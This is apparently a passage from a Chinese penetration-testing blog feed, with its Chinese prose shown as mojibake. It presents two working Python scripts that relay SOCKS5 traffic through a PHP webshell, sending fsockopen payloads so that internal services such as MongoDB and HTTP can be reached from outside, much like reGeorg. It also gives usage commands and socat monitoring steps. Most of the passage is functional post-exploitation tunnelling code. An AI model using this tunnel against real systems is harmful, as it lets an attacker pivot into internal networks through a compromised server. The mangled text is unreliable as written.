ä¸Šé¢çš„è„šæœ¬ï¼Œè®©ä»–é€‚åˆproxychainsã€‚</p><h3 id="å°è¯•2"><a href="#å°è¯•2" class="headerlink" title="å°è¯•2"></a>å°è¯•2</h3><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8import socketimport binasciiimport urllibimport sysimport requestsVER &#x3D; &quot;\x05&quot;METHOD &#x3D; &quot;\x00&quot;SUCCESS &#x3D; &quot;\x00&quot;SOCKFAIL &#x3D; &quot;\x01&quot;NETWORKFAIL &#x3D; &quot;\x02&quot;HOSTFAIL &#x3D; &quot;\x04&quot;REFUSED &#x3D; &quot;\x05&quot;TTLEXPIRED &#x3D; &quot;\x06&quot;UNSUPPORTCMD &#x3D; &quot;\x07&quot;ADDRTYPEUNSPPORT &#x3D; &quot;\x08&quot;UNASSIGNED &#x3D; &quot;\x09&quot;def parseSocks5(sock):    nmethods, methods &#x3D; (sock.recv(1), sock.recv(1))    # print nmethods,methods    sock.sendall(VER + METHOD)    ver &#x3D; binascii.b2a_hex(sock.recv(1))    # print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4    if ver &#x3D;&#x3D; &quot;\x02&quot;:  # this is a hack for proxychains        ver, cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))    else:        cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1))    target &#x3D; None    targetPort &#x3D; None    if atyp &#x3D;&#x3D; &quot;\x01&quot;:  # IPv4                # Reading 6 bytes for the IP and Port        target &#x3D; sock.recv(4)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;.&quot; .join([str(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x03&quot;:  # Hostname        targetLen &#x3D; ord(sock.recv(1))  # hostname length (1 byte)        target &#x3D; sock.recv(targetLen)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;&quot;.join([unichr(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x04&quot;:  # IPv6        target &#x3D; sock.recv(16)        targetPort &#x3D; sock.recv(2)        tmp_addr &#x3D; []        for i in xrange(len(target) &#x2F; 2):            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))        target &#x3D; &quot;:&quot;.join(tmp_addr)    targetPort &#x3D; ord(targetPort[0]) * 256 + ord(targetPort[1])    # print targetPort    # print target    if cmd &#x3D;&#x3D; &quot;\x02&quot;:  # BIND        raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x03&quot;:  # UDP        raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x01&quot;:  # CONNECT        serverIp &#x3D; target        serverIp &#x3D; &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])    sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort &#x2F; 256) + chr(targetPort % 256))    # print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))    return target,targetPortdef sendPayload(sock,flag&#x3D;&#39;&#39;):    print &quot;[Prepare Payload]&quot;    try:        data &#x3D; sock.recv(20480)    except:        print &quot;Closing Proxy&quot;        s.close()        exit(0)    if data:        print &quot;&lt;&lt; Recving Data From Client&quot;        tmp_payload &#x3D; &quot;$res &#x3D; fsockopen(&#39;%s&#39;,%s);&quot; % (target, targetPort)        tmp_payload +&#x3D; &quot;$raw &#x3D; hex2bin(&#39;&quot; + binascii.b2a_hex(flag+data) + &quot;&#39;);&quot;        tmp_payload +&#x3D; &quot;stream_set_timeout($res,1);&quot;        # tmp_payload +&#x3D; &quot;stream_set_blocking(true);&quot;        tmp_payload +&#x3D; &quot;fwrite($res,$raw);&quot;        tmp_payload +&#x3D; &quot;while ($o &#x3D;fgets($res,100))&#123;if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;Connect Failed&#39;;&#125;&quot;        tmp_payload +&#x3D; &quot;$readBuff .&#x3D; $o;&#125;&quot;        tmp_payload +&#x3D; &quot;echo $readBuff;&quot;        tmp_payload +&#x3D; &quot;fclose($res);&quot;        # print tmp_payload        payload &#x3D; urllib.quote(tmp_payload)        # print &quot;The payload is: %s&quot; %payload        shell &#x3D; sys.argv[1]        p &#x3D; sys.argv[2]        exp &#x3D; &quot;%s&#x3D;%s&quot; % (p, payload)        content &#x3D; requests.post(shell, data&#x3D;exp, proxies&#x3D;&#123;&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,                                headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;).content        sock.send(content)        print &quot;&gt;&gt; Sending Data to Client&quot;        flag2 &#x3D; sock.recv(1)        while flag2:            sendPayload(sock,flag2)        # else:        #     s.close()        #     exit(0)        # # s.close()    else:        passs &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)s.bind((&quot;127.0.0.1&quot;, 9999))s.listen(5)while 1:    try:        sock, addr_info &#x3D; s.accept()        print &quot;[Accept Bytes]&quot;        flag &#x3D; sock.recv(1)        if flag &#x3D;&#x3D; &quot;\x05&quot;:            target, targetPort &#x3D; parseSocks5(sock)            sendPayload(sock)        else:            sendPayload(sock,flag)    except KeyboardInterrupt:        exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨æ–¹æ³•: <code>python rego.py &lt;webshell&gt; &lt;webshell&#39;s pass&gt;</code> </p><p>è¿™ä¸ªå¾ˆçƒ‚çš„å•çº¿ç¨‹ä»£ç å®ç°äº†è¿™æ ·çš„åŠŸèƒ½:</p><ol><li>å¼€å¯ä¸€ä¸ªæœ¬åœ°çš„9999çš„socks5ä»£ç†</li><li>ä½¿ç”¨è¿™ä¸ªä»£ç†å¯ä»¥ç”¨curlè®¿é—®å†…ç½‘webæœåŠ¡</li><li>å¯ä»¥è®¿é—®è¿™äº›æ•°æ®åº“ï¼Œmongoå¯ç”¨</li><li>ä½¿ç”¨äº†8080ä½œä¸ºä»£ç†ï¼Œæ”¾åœ¨burpé‡Œé¢çœ‹æµé‡</li></ol><p>æœ‰è¿™æ ·çš„ç¼ºç‚¹:</p><ol><li>curlè®¿é—®webå’Œè®¿é—®mongoåªèƒ½é€‰ä¸€ä¸ª(æ¯”å¦‚å¼€äº†ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªè®¿é—®httpï¼Œä¸€ä¸ªè®¿é—®mongo)</li><li>é€Ÿåº¦å¾ˆæ…¢ï¼Œå–å†³äºå®é™…ç¯å¢ƒï¼Œè‡ªå·±è°ƒtimeout</li><li>sshæˆ–è€…mysqlä¸èƒ½ç”¨ï¼Œå› ä¸ºæ²¡æœ‰ä¿æŒsocksè¿æ¥ã€‚</li></ol><p>ä¸ºä»€ä¹ˆreGeorgå°±å¯ä»¥ï¼Ÿå› ä¸ºreGeorgç”¨<code>while true</code>å¾ªç¯ä¿æŒäº†socksè¿æ¥ï¼Œé€šè¿‡å†™å…¥cookieçš„æ•°æ®è¿›è¡Œäº¤äº’ã€‚</p><p>æµ‹è¯•ä¸»è¦ä½¿ç”¨äº†socatè½¬å‘æµé‡:</p><pre class="line-numbers language-none"><code class="language-none">socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>æµ‹è¯•äº†ä¸‹redisä¸å¯ç”¨ï¼Œå› ä¸ºé»˜è®¤redisä½¿ç”¨çš„æ˜¯RESPçš„åè®®ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚&lt;br&gt;ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹&lt;br&gt;ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h3 id=&quot;å°è¯•1&quot;&gt;&lt;a href=&quot;#å°è¯•1&quot; class=&quot;headerlink&quot; title=&quot;å°è¯•1&quot;&gt;&lt;/a&gt;å°è¯•1&lt;/h3&gt;&lt;p&gt;è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#coding: utf-8
import socket
import binascii
import requests


headers &amp;#x3D; &amp;#123;
&amp;quot;Host&amp;quot;: &amp;quot;&amp;quot;,
&amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;,
&amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla&amp;#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&amp;#x2F;20050405 Firefox&amp;#x2F;1.0 (Ubuntu package 1.0.2)&amp;quot;,
&amp;quot;Content-Type&amp;quot;: &amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;,
&amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;
&amp;#125;

url &amp;#x3D; &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;eval.php&amp;quot;
s &amp;#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&amp;quot;127.0.0.1&amp;quot;,8889))
s.listen(5)
sock, addr_info &amp;#x3D; s.accept()

while True:
    print &amp;#39;Connect by &amp;#39;, addr_info
    data &amp;#x3D; sock.recv(102400)
    payload &amp;#x3D; &amp;#39;pass&amp;#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&amp;#39; + hex2bin(data) + &amp;quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&amp;#39;timed_out&amp;#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&amp;#39;false%20lala&amp;#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&amp;quot;
    print payload
    data2 &amp;#x3D; requests.post(url&amp;#x3D;url,headers&amp;#x3D;headers,data&amp;#x3D;payload,proxies&amp;#x3D;&amp;#123;&amp;quot;http&amp;quot;:&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1:8080&amp;quot;&amp;#125;,timeout&amp;#x3D;30).content
    print data2
    print &amp;quot;sending data&amp;quot;
    sock.send(data2)&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;hex2bin is available with PHP Version &amp;gt;= 5.4.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,&lt;code&gt;mongo --port 8889&lt;/code&gt;,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:&lt;/p&gt;
 &lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;python mongo_proxy  &amp;#x2F;&amp;#x2F;ç›‘å¬8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &amp;#x2F;&amp;#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹
mongo --port 8888  &amp;#x2F;&amp;#x2F;è¿æ¥8888&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„&lt;code&gt;å­é›†&lt;/code&gt;ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
